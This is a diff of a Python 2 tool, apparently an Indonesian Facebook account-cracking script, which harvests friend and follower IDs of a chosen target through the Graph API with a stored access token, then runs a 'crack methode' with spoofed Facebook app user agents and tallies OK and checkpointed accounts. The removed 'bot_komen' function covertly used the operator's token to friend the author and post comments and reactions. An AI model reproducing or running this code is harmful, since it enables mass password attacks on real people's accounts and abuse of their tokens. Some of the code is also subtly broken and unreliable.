@@ -53,10 +53,10 @@ tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 tgl = ("%s %s %s"%(ha, op, ta))
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-
+             
 def logo():
 	os.system("clear")
-	print("""\033[1;97m      
+	print("""\033[1;97m 
                   \033[1;91m───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
                   ───█▒▒░░░░░░░░░▒▒█───
                   ────█░░█░░░░░█░░█────
@@ -107,26 +107,6 @@ def login():
 		except KeyError:
 			os.system("rm -f login.txt")
 			exit("[?] Login Error")
-######BOT KOMEN#######
-def bot_komen():
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\033[1;39m[!] Token invalid"
-		os.system('rm -rf login.txt')
-	una = ('100004412526309')
-	kom = ('Kanyaah Nenk Manda😊')
-	reac = ('LOVE')
-	post = ('1874741336016266')
-	post2 = ('1874741336016266')
-	kom2 = ('Please send me this script🙏')
-	reac2 = ('ANGRY')
-	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
-	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
-	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
-	menu()
 	
 def menu():
 	os.system("clear")
@@ -234,7 +214,7 @@ def follower():
 		token = open("login.txt", "r").read()
 	except IOError:
 		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
-	idt = raw_input("\033[1;93m➤\033[1;97m Target Id     : ")
+	idt = raw_input("\033[1;93m➤\033[1;97m Target Id   : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
 			uid = i["id"]
@@ -242,23 +222,28 @@ def follower():
 			id.append(uid+"<=>"+nama)
 	except KeyError:
 		exit("URL Error")
-	print("\033[1;93m➤\033[1;97m Total Id      : \033[0;91m%s\033[0;97m"%(len(id))) 
+	print("[?] Total id  : \033[0;92m%s\033[0;96m"%(len(id))) 
 
 def massal():
 	global token
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
-	idt = raw_input("\033[1;93m➤\033[1;97m Target Id     : ")
+		exit("\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
 	try:
-	         for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
-		           uid = i["id"]
-			   nama = n["name"].rsplit(" ")[0]
-			   id.append(uid+"<=>"+nama)
-	 except KeyError:
-                 exit("URL Error")
-	 print("\033[1;93m➤\033[1;97m Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
+		tanya_Total = int(input("\033[1;93m➤\033[1;97m Enter Multiple ID Option  : "))
+	except:tanya_Total=1
+	for t in range(tanya_Total):
+		t +=1
+		idt = raw_input("\033[1;93m➤\033[1;97m Target Id %s   : "%(t))
+		try:
+			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
+				uid = i["id"]
+				nama = n["name"].rsplit(" ")[0]
+				id.append(uid+"<=>"+nama)
+		except KeyError:
+			print("\033[1;93m➤\033[1;97m  Ids friend list Is not public")
+	print("\033[1;93m➤\033[1;97m Total id  : \033[0;92m%s\033[0;96m"%(len(id)))
 
 def method():
 	print("\033[1;93m➤\033[1;97m Choose crack methode [ \033[1;92mRecommended B-API \033[1;97m]")
@@ -313,7 +298,6 @@ def bapi(user):
 		ua = open(".ua", "r").read()
 	except IOError:
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
-                ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;], Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
 	global loop, token
 	sys.stdout.write(
 		"\r\033[1;93m[\033[1;92mSTAR] \033[1;91m•••>\033[1;92m %s/%s •••> OK:-%s ••• CP:-%s "%(loop, len(id), len(ok), len(cp))
